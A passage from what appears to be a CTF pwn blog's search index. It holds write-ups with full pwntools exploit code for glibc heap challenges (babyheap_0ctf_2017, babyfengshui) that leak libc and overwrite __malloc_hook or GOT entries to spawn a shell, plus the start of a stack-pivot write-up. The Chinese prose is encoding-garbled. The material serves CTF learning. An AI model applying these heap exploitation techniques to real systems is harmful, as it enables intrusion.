2 remove(0) # gdb.attach(p) # input() allocate(0x100, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 3 # allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 4 # gdb.attach(p) payload = flat([ b\u0026#34;a\u0026#34;*0x108, 0, 0x89, b\u0026#34;a\u0026#34;*0x80, 0, 0x89, m_elf.got[\u0026#39;free\u0026#39;] ]) change(3, payload) # gdb.attach(p) free_addr = ug(show(1)[\u0026#39;description\u0026#39;].ljust(4, b\u0026#34;\\x00\u0026#34;)) libc_base = free_addr - libc.sym[\u0026#39;free\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] suclog( free_addr=free_addr, libc_base=libc_base, system_addr=system_addr ) payload = flat(system_addr) change(1, payload) remove(2) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%BB%95%E8%BF%87%E5%A0%86%E6%BA%A2%E5%87%BA%E9%99%90%E5%88%B6buuctf-babyfengshui_33c3_2016/","section":"writeup","summary":"In times of change, learners inherit the earth, while the learned find themselves beautifully equipped to deal with a world that no longer exists. â€” Eric Hoffer åŸé¢˜é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å¯ä»¥çœ‹åˆ°æ˜¯æ ‡å‡†çš„èœå•å †é¢˜ allocate è¿™é‡Œè‡ªå®šä¹‰äº†ç»“æ„ä½“ åœ¨endså¤„æŒ‰dæ–°å»º","tags":["pwn","ç»•è¿‡å †æº¢å‡ºé™åˆ¶"],"title":"ã€ç»•è¿‡å †æº¢å‡ºé™åˆ¶ã€‘BUUCTF babyfengshui_33c3_2016"},{"categories":["writeup"],"contents":" It is only when the mind and character slumber that the dress can be seen. â€” Ralph Waldo Emerson\nåŸé¢˜é“¾æ¥\nè¿™ä¸€é¢˜æ˜¯ä½œè€…çš„ç¬¬ä¸€é“å †é¢˜ï¼Œç»™ä½œè€…çš„ç¬¬ä¸€æ„Ÿå—å°±æ˜¯ç¥ä¹å…¶ç¥ï¼Œåœ¨å‚è€ƒäº†ç½‘ç»œä¸Šçš„ä¸€äº› WP åå†™ä¸‹è‡ªå·±çš„ WPï¼Œå¦‚æœ‰é”™è¯¯çƒ¦è¯·æ–§æ­£\nå‚è€ƒæ–‡ç«  checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  allocate fill Free dump åŸºæœ¬æ€è·¯ æ„å»º exp é’ˆå¯¹å››ä¸ªé€‰é¡¹ç¼–å†™å››ä¸ªè¾“å…¥å‡½æ•° å¾—åˆ°åˆå§‹ chunk å®‰æ’æŒ‡å‘ chunk 4 çš„æŒ‡é’ˆ å°†chunk 4æ”¾è¿›unsorted binä¸­è·å–libcåŸºå€ è¦†å†™ä»»æ„åœ°å€çš„æ•°æ® å®Œæ•´exp å‚è€ƒæ–‡ç«  0ctf2017 babyheap ã€PWNç³»åˆ—ã€‘ Buuctf babyheap_0ctf_2017 Writeup babyheap_0ctf_2017 å †æŠ€å·§ ctfwiki å †æ¦‚è¿° checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file babyheap_0ctf_2017 [*] \u0026#39;/home/peterl/security/workspace/babyheap_0ctf_2017/babyheap_0ctf_2017\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  è¿™ä¸ªç¨‹åºæ•…æ„æŠŠ.symtabèŠ‚åˆ æ‰äº†ï¼Œæ‰€ä»¥æ²¡æœ‰å‡½æ•°åç§°ï¼Œè¿™é‡Œä½œè€…åœ¨ ida ä¸­ç®€å•åœ°é‡å‘½åäº†ä¸€ä¸‹\nallocate è¿™ä¸ªå‡½æ•°ä¼šåˆ†é…ä¸€ä¸ªå¤§å°å°äº 4096 çš„å†…å­˜å—ï¼ˆä¸å­˜åœ¨ç¬¦å·ä½æ¼æ´ï¼‰ï¼Œè€Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªå†…å­˜å—ä¼šæ˜¯ä» top_chunk ä¸­åˆ†å‰²å‡ºæ¥çš„ï¼š\nç„¶åï¼Œmalloc ä¼šè¿”å›æŒ‡å‘ chunk ä¸­size çš„å°¾éƒ¨ï¼Œuser_data çš„é¦–éƒ¨ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ fd æŒ‡é’ˆçš„é¦–éƒ¨çš„æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆä¼šå­˜æ”¾åœ¨ä¸€ä¸ªå¤§æ•°ç»„ä¸­ï¼Œè€Œè¿™ä¸ªå¤§æ•°ç»„æ˜¯ä»¥ä¸‰ä¸ªå•å…ƒä¸ºä¸€ä¸ªå®ä½“çš„ï¼Œå¯ä»¥çœ‹ä½œå®ƒæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œè¿™ä¸ªç»“æ„ä½“æ•°ç»„çš„æ„é€ å¦‚ä¸‹ï¼š\nfill è¿™ä¸ªå‡½æ•°åœ¨æ£€æŸ¥å†…å­˜æ˜¯å¦å¯ç”¨ï¼ˆæ ‡å¿—æ˜¯å¦ä¸º 1ï¼‰åä¼šå‘å¯¹åº”ç´¢å¼•çš„å†…å­˜ä¸­å¡«å…¥ä»»æ„å¤§å°çš„æ•°æ®ï¼Œè¿™ä¸ªæ•°æ®é•¿åº¦æ˜¯ç”±ç”¨æˆ·éšæ„æŒ‡å®šçš„ï¼ï¼è¿™é‡Œå°±å‡ºç°äº†å †æº¢å‡ºæ¼æ´\nFree åœ¨æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦ä¸º 1 åï¼Œå®ƒä¼šå°†æ ‡è¯†ä½ã€size ç½®é›¶ï¼Œå¹¶é‡Šæ”¾å†…å­˜\ndump è¿™ä¸ªå‡½æ•°åœ¨æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦ä¸º 1 åï¼Œä¼šå°†å†…å­˜ä¸­çš„å†…å®¹æ‰“å°å‡ºæ¥\nåŸºæœ¬æ€è·¯ æˆ‘ä»¬æƒ³ä¸€ä¸‹è¿™ä¹ˆä¸€ä»¶äº‹ï¼šåœ¨æˆ‘ä»¬çš„ç»“æ„ä½“æ•°ç»„ä¸­ï¼Œç†è®ºä¸Šæ¯ä¸€ä¸ªç»“æ„ä½“å†…çš„å†…å­˜åœ°å€æ˜¯ä¸ä¸€æ ·çš„ï¼Œè€Œä¸”å¦‚æœå†…å­˜è¢«é‡Šæ”¾ï¼Œæ ‡å¿—ä½ä¹Ÿä¼šè¢«ç½®é›¶ï¼Œä»è€Œä¹Ÿå°±æ— æ³•è®¿é—®ã€‚\né‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœæˆ‘ä»¬è®©ä¸¤ä¸ªç»“æ„ä½“å†…çš„æŒ‡é’ˆéƒ½æŒ‡å‘åŒä¸€å—å†…å­˜ï¼Œé‚£ä¹ˆå°±ç®—è¿™å—å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªæŒ‡é’ˆè®¿é—®è¿™å—å·²è¢«é‡Šæ”¾çš„ç©ºé—´\nåŒæ—¶ï¼Œæˆ‘ä»¬çŸ¥é“ä¸‰ä»¶äº‹ï¼š\nå½“ç”¨æˆ·éœ€è¦çš„ chunk çš„å¤§å°å°äº fastbin çš„æœ€å¤§å¤§å°æ—¶ï¼Œ ptmalloc ä¼šé¦–å…ˆåˆ¤æ–­ fastbin ä¸­ç›¸åº”çš„ bin ä¸­æ˜¯å¦æœ‰å¯¹åº”å¤§å°çš„ç©ºé—²å—ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±ä¼šç›´æ¥ä»è¿™ä¸ª bin ä¸­è·å– chunkï¼ˆé»˜è®¤æœ€å¤§å¤§å°ä¸º(64 * SIZE_SZ / 4)ï¼Œ32 ä½ä¸º 64=0x40 å­—èŠ‚ï¼Œ64 ä½ä¸º 128=0x80 å­—èŠ‚ï¼‰ å¦‚æœ unsorted bin å†…æœ‰ä¸”ä»…æœ‰ä¸€å— chunk æ—¶ï¼Œè¿™å— chunk çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main_arena + 0x58 ï¼Œè€Œä¸” main_arena åˆç›¸å¯¹ libc å›ºå®šåç§» 0x3c4b20 å¦‚æœmalloc_hookå­˜åœ¨ï¼Œmallocä¼šå…ˆè°ƒç”¨__malloc_hookçš„å€¼æŒ‡å‘çš„å‡½æ•° é‚£ä¹ˆï¼Œå‡è®¾æˆ‘ä»¬èƒ½è·å¾—ä¸€ä¸ªæŒ‡å‘ unsorted bin ä¸­å”¯ä¸€ chunk çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±èƒ½æˆåŠŸè·å¾— libc åŸºå€ã€‚\nè€Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰äº†ä¸€ä¸ªæŒ‡å‘ fast bin ä¸­ chunk çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿæ›´æ”¹å…¶ fd æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶ malloc åˆ°çš„åœ°å€çš„å€¼ï¼Œä»è€Œæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ä»»ä½•åœ°å€çš„å†…å®¹\nç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹__malloc_hookçš„å€¼ï¼Œä»è€Œæ›´æ”¹mallocçš„è¡Œä¸º\næ„å»º exp é’ˆå¯¹å››ä¸ªé€‰é¡¹ç¼–å†™å››ä¸ªè¾“å…¥å‡½æ•° def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] å¾—åˆ°åˆå§‹ chunk æˆ‘ä»¬éœ€è¦åˆ†é…å‡ ä¸ª chunkï¼Œå…¶ä¸­æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå¤§å°è¶…è¿‡ fast bin çš„é™åˆ¶ï¼Œä¼šè¢«æ”¾è¿› unsorted bin ä¸­\nç„¶åæˆ‘ä»¬ä¼š allocate ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ˜¯æ­£å¸¸çš„ fast bin é‡Œé¢çš„å†…å®¹ï¼Œä¸€æ¬¡æŒ‡å‘ä¼šè¢«æ”¾å…¥ unsorted bin ä¸­çš„å¤§ chunkã€‚\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆåˆ’å‡º 4 ä¸ª 0x10 çš„ chunkï¼ˆsize ä½=prev_size+size+prev_inuse+0x10=0x20ï¼‰ï¼Œå†åˆ’å‡ºä¸€å— 0x80 å¤§å°çš„ chunk ç”¨ä»¥æ”¾è¿› unsorted bin ä¸­ï¼š\nå› æ­¤æˆ‘ä»¬å¯ä»¥åˆå§‹åˆ†é…äº”ä¸ª chunkï¼š\nallocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) å®‰æ’æŒ‡å‘ chunk 4 çš„æŒ‡é’ˆ æˆ‘ä»¬åªè¦è¦†å†™äº† chunk 2 çš„ fd æŒ‡é’ˆï¼Œè®©å®ƒæŒ‡å‘ chunk 4ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡ allocate çš„æ—¶å€™ï¼Œå¾—åˆ°çš„å°±æ˜¯æŒ‡å‘ chunk 4 çš„æŒ‡é’ˆ\nå…·ä½“æ­¥éª¤ï¼š\nè¿™é‡Œæˆ‘ä»¬å…ˆæŠŠ chunk 1 å’Œ chunk 2 free æ‰ï¼Œè¿™æ ·å­ chunk 1 å’Œ chunk 2 çš„fdæŒ‡é’ˆå°±ç”Ÿæ•ˆäº†ã€‚\nåˆå› ä¸ºæˆ‘ä»¬å¯ä»¥å‘ä¸€å—chunkå†…å¡«å…¥ä»»æ„å¤§å°çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å°†payload1å¡«è¿›chunk0ç”¨ä»¥è¦†å†™chunk2çš„fdæŒ‡é’ˆ\nç„¶åä¸ºäº†ä¿è¯chunk4è¢«æ­£ç¡®åˆ†é…ï¼Œæˆ‘ä»¬å¯ä»¥å°†payload2å¡«å…¥chunk3ä¸­ï¼Œç”¨ä»¥è¦†å†™chunk4çš„size\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œchunk 4 çš„ size ä½è¦è®¾ç½®æˆ 0x21ï¼Œä¸ç„¶åœ¨allocate(0x10)çš„æ—¶å€™ï¼Œå› ä¸ºå¤§å°ä¸ä¸€æ ·ï¼Œmalloc æ—¶æ˜¯æ²¡æœ‰åŠæ³•åˆ†é…åˆ° chunk 4 çš„\nç„¶åæˆ‘ä»¬å°±å¯ä»¥allocateä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡åˆ†é…åˆ°çš„å°±æ˜¯chunk4äº†ï¼Œè¿™æ—¶chunk2æŒ‡å‘çš„ä¹Ÿæ˜¯chunk4äº†ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å°†chunk 4 çš„sizeä½æ¢å¤åŸçŠ¶ï¼Œå› ä¸ºæˆ‘ä»¬ä¸‹ä¸€æ­¥æ˜¯è¦æŠŠchunk 4æ”¾å…¥unsorted binä¸­\nfree(1) free(2) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) # è¦†ç›–sizeä½ payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) # å¾—åˆ°chunk4æŒ‡é’ˆ allocate(0x10) # æ¢å¤sizeä½ payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) å°†chunk 4æ”¾è¿›unsorted binä¸­è·å–libcåŸºå€ æˆ‘ä»¬ä¸èƒ½ç›´æ¥æŠŠchunk 4 freeæ‰ï¼Œå› ä¸ºchunk 4å’Œtop chunkç›¸é‚»ï¼Œç›´æ¥freeæ‰ä¼šä½¿chunk 4å¹¶å…¥top chunk\nå› æ­¤æˆ‘ä»¬allocateä¸€ä¸ªchunk 5ï¼Œç„¶åfreeæ‰chunk 4ï¼Œåˆå› ä¸ºæ­¤æ—¶chunk 4è™½ç„¶ç”±äºæ ‡å¿—ä½ä¸º0ä¸å¯è®¿é—®ï¼Œä½†æ˜¯chunk 2ä»èƒ½è¢«dumpå‡½æ•°è¯†åˆ«ä¸ºæœªé‡Šæ”¾çš„ç©ºé—´ï¼Œä»è€Œè¯»å–å†…å®¹ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬ç›´æ¥dump chunk 2ï¼Œå‡å»å›ºå®šå€¼0x3c4b78ï¼Œå°±å¾—åˆ°äº†libcåŸºå€\nallocate(0x80) free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) è¦†å†™ä»»æ„åœ°å€çš„æ•°æ® å½“æˆ‘ä»¬é€šè¿‡è¦†å†™chunk 2çš„fdä½çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥å·²ç»å‘ç°äº†ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†fdä½è¦†å†™ä¸ºä»»æ„æˆ‘ä»¬å–œæ¬¢çš„åœ°å€\næˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†å†™codeæ®µä¸­çš„__malloc_hookå‡½æ•°æ¥æ”¹å˜mallocçš„è¡Œä¸ºï¼Œè¿™ä¸ªå‡½æ•°çš„è¯¦ç»†è¯´æ˜è§æ­¤ï¼Œè¿™é‡Œè´´ä¸€æ®µæˆ‘ä»¬è¿™ä¸ªç¨‹åºè¦ç”¨åˆ°çš„è¯´æ˜ï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œ__malloc_hookå‡½æ•°çš„å€¼æ˜¯mallocä¼šåœ¨å®ƒè¢«callçš„æ—¶å€™ä½¿ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ”¹__malloc_hookçš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½æ›´æ”¹mallocçš„è¡Œä¸º\n__malloc_hookå‡½æ•°çš„åç§»å­˜åœ¨symè¡¨ä¸­ï¼š\n$ readelf -aW libc-2.23.so | grep hook 00000000003c3dc8 000006fb00000006 R_X86_64_GLOB_DAT 00000000003c67b0 __malloc_initialize_hook@@GLIBC_2.2.5 + 0 00000000003c3ea8 000001e700000006 R_X86_64_GLOB_DAT 00000000003c9560 argp_program_version_hook@@GLIBC_2.2.5 + 0 00000000003c3eb0 0000072200000006 R_X86_64_GLOB_DAT 00000000003c67a0 __after_morecore_hook@@GLIBC_2.2.5 + 0 00000000003c3ee0 000008ae00000006 R_X86_64_GLOB_DAT 00000000003c4b00 __memalign_hook@@GLIBC_2.2.5 + 0 00000000003c3ef0 0000044000000006 R_X86_64_GLOB_DAT 00000000003c4b10 __malloc_hook@@GLIBC_2.2.5 + 0 00000000003c3ef8 000000d600000006 R_X86_64_GLOB_DAT 00000000003c67a8 __free_hook@@GLIBC_2.2.5 + 0 00000000003c3fd0 000005cb00000006 R_X86_64_GLOB_DAT 00000000003c4b08 __realloc_hook@@GLIBC_2.2.5 + 0 214: 00000000003c67a8 8 OBJECT WEAK DEFAULT 34 __free_hook@@GLIBC_2.2.5 487: 00000000003c9560 8 OBJECT GLOBAL DEFAULT 34 argp_program_version_hook@@GLIBC_2.2.5 958: 00000000003c92e0 8 OBJECT GLOBAL DEFAULT 34 _dl_open_hook@@GLIBC_PRIVATE 1088: 00000000003c4b10 8 OBJECT WEAK DEFAULT 33 __malloc_hook@@GLIBC_2.2.5 1483: 00000000003c4b08 8 OBJECT WEAK DEFAULT 33 __realloc_hook@@GLIBC_2.2.5 1787: 00000000003c67b0 8 OBJECT WEAK DEFAULT 34 __malloc_initialize_hook@@GLIBC_2.2.5 1826: 00000000003c67a0 8 OBJECT WEAK DEFAULT 34 __after_morecore_hook@@GLIBC_2.2.5 2222: 00000000003c4b00 8 OBJECT WEAK DEFAULT 33 __memalign_hook@@GLIBC_2.2.5 æ³¨æ„ï¼Œå› ä¸ºé»˜è®¤è¾“å‡ºå®½åº¦é™åˆ¶çš„åŸå› ï¼Œåªç”¨readelf -aå‘½ä»¤æ— æ³•è¾“å‡º__malloc_hookè€Œæ˜¯__m[\u0026hellip;]ï¼Œå¿…é¡»åŠ ä¸Š-Wæˆ–è€…--widthé€‰é¡¹æ‰èƒ½åŠ å®½\nè¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œåœ¨__malloc_hook-0x23å¤„mallocå¯ä»¥ä½¿sizeä½åˆšå¥½ä¸º0x7fï¼Œè¿™æ ·å­å°±å¯ä»¥æ›´æ”¹__malloc_hookçš„å€¼\næˆ‘ä»¬å†ç”¨one_gadgetå‘½ä»¤æ‰¾ä¸€ä¸‹å¯ç”¨çš„gadgetï¼š\n$ one_gadget libc-2.23.so 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL å› ä¸ºæœ‰äº›gadgetå¯¹æ ˆæœ‰è¦æ±‚ï¼Œæ‰€ä»¥åªæœ‰ä¸€äº›å¯ä»¥ç”¨ã€‚è¯•äº†ä¸€ä¸‹ï¼Œç¬¬äºŒä¸ªåˆšå¥½æ˜¯å¯ä»¥ç”¨çš„\nallocate(0x60) free(4) # æ›´æ”¹fdæŒ‡é’ˆ payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # æ›´æ”¹__malloc_hookçš„å€¼ # prev_size+size=0x10ï¼Œç„¶åè¦å¡«å……0x13çš„ç©ºä½æ‰èƒ½åˆ°__malloc_hookçš„ä½ç½® payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) ç„¶åallocateä»»æ„ä¸€ä¸ªå€¼å°±å¯ä»¥å¾—åˆ°shellå•¦\nå®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64, p8 import sys from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyheap_0ctf_2017\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;25943\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x1329\u0026#34;) else: p = process([\u0026#34;ld-2.23.so\u0026#34;, fn], env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) # p = process(fn) libc = ELF(libc_name) def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) # gdb.attach(p) free(1) free(2) # gdb.attach(p) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) allocate(0x10) payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) allocate(0x80) free(4) # gdb.attach(p) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) allocate(0x60) free(4) # gdb.attach(p) payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # gdb.attach(p) payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) # gdb.attach(p) allocate(0x10) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/","section":"writeup","summary":"It is only when the mind and character slumber that the dress can be seen. â€” Ralph Waldo Emerson åŸé¢˜é“¾æ¥ è¿™ä¸€é¢˜æ˜¯ä½œè€…çš„ç¬¬ä¸€é“å †é¢˜ï¼Œç»™ä½œè€…çš„ç¬¬ä¸€æ„Ÿå—å°±æ˜¯ç¥ä¹å…¶ç¥ï¼Œåœ¨å‚è€ƒäº†ç½‘ç»œä¸Šçš„ä¸€äº› WP åå†™ä¸‹è‡ªå·±çš„ WPï¼Œå¦‚æœ‰é”™è¯¯","tags":["pwn","é¦–é“å †é¢˜","fastbin attack","unsorted bin main_arena leak"],"title":"ã€é¦–é“å †é¢˜ã€‘ã€fastbin attackã€‘ã€unsorted bin main_arena leakã€‘babyheap_0ctf_2017"},{"categories":["writeup"],"contents":" Self-trust is the first secret of success. â€” Ralph Waldo Emerson\nåŸé¢˜é“¾æ¥\nã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ã€Write-upã€‘BUUCTF ciscn_2019_es_2 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ˆè¿ç§»çš„åŸºæœ¬æ€è·¯ æ³„éœ²ebp å¼€å§‹æ ˆè¿ç§» å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_2019_es_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_es_2/ciscn_2019_es_2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) æ²¡å•¥ç‰¹æ®Šçš„ï¼Œæ³¨æ„ä¸€ä¸‹32ä½å°±å¯\nidaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  çœ‹èµ·æ¥åƒæ˜¯æ ˆæº¢å‡ºï¼Œä½†æ˜¯readå‡½æ•°é™åˆ¶äº†è¯»å…¥çš„å­—èŠ‚æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ ˆï¼š\næˆ‘ä»¬å‘ç°è¿™æ—¶å€™åˆ°returnçš„ä½ç½®åªèƒ½æº¢å‡ºä¸€ä¸ªå­—ï¼Œå¦‚æœè¿™æ—¶å€™ç¨‹åºæœ‰ä¸€ä¸ªbackdoorå‡½æ•°é‚£å°±ä¸‡äº‹å¤§å‰ã€‚\næˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªhackå‡½æ•°ï¼Œä½†è¿™ä¸ªhackå‡½æ•°å®Œå…¨å°±æ˜¯ç³Šå¼„äººçš„ï¼Œä»ä¸­å”¯ä¸€å¾—åˆ°çš„æœ‰ç”¨ä¿¡æ¯æ˜¯systemç¡®ä¹å­˜åœ¨äºpltè¡¨ä¸­ï¼Œè¿™æ ·å°±ä¸ç”¨ret2libcäº†ï¼š\nçœ‹ä¸€ä¸‹æºç¨‹åºä¹Ÿæ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ ˆè¿ç§»\næˆ‘ä»¬åªè¦æ³„éœ²å‡ºebpï¼Œç„¶åå†é€šè¿‡ç¬¬äºŒæ¬¡leave;retå°±å¯ä»¥å°†espæ›´æ”¹åˆ°æˆ‘ä»¬å¸Œæœ›çš„åœ°æ–¹\næ„å»ºexp æ ˆè¿ç§»çš„åŸºæœ¬æ€è·¯ æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨callä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå…ˆå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€è¿›æ ˆï¼Œå†å°†å½“å‰çš„ebpè¿›æ ˆï¼Œç„¶åå°†å½“å‰espçš„å€¼èµ‹ç»™ebpï¼Œè¿™æ ·å°±å®ç°äº†å¤‡ä»½ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€ebpåŸæœ¬çš„å€¼ã€espåŸæœ¬çš„å€¼çš„ä½œç”¨\nç„¶åç­‰åˆ°å‡½æ•°ç»“æŸæ—¶ï¼Œç¨‹åºä¼šæ‰§è¡ŒleaveæŒ‡ä»¤å’ŒretæŒ‡ä»¤ã€‚leaveæŒ‡ä»¤ç›¸å½“äºmov esp, ebp; pop ebpï¼Œæ„æ€å°±æ˜¯ä»å¤‡ä»½ä¸­å…ˆæ¢å¤espå†æ¢å¤ebpï¼›retæŒ‡ä»¤ç›¸å½“äºpop eipï¼Œæ„æ€å°±æ˜¯æ¢å¤å¤‡ä»½çš„æŒ‡ä»¤åœ°å€ï¼Œè¿™æ ·å°±èƒ½æ‰§è¡Œå‡½æ•°è°ƒç”¨çš„ä¸‹ä¸€æ¡è¯­å¥äº†\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ›´æ”¹æ ˆä¸­å¤‡ä»½çš„ebpæ•°æ®çš„åŒæ—¶ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ä¸€æ¬¡leave; retåå†æ‰§è¡Œä¸€éï¼Œé‚£ä¹ˆå› ä¸ºebpçš„å¤‡ä»½å·²è¢«æ›´æ”¹ï¼Œæ‰€ä»¥ebpæ¢å¤çš„å°±æ˜¯æˆ‘ä»¬å¸Œæœ›çš„æ•°æ®ï¼Œè€Œå†æ‰§è¡Œä¸€éleave; retæ—¶ï¼Œç¨‹åºæ˜¯å‡å®šebpä¸­ä¿å­˜çš„æ˜¯espçš„å¤‡ä»½ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸåœ°æ›´æ”¹espã€‚\nè¿™æ—¶æˆ‘ä»¬å·²ç»è®©æ 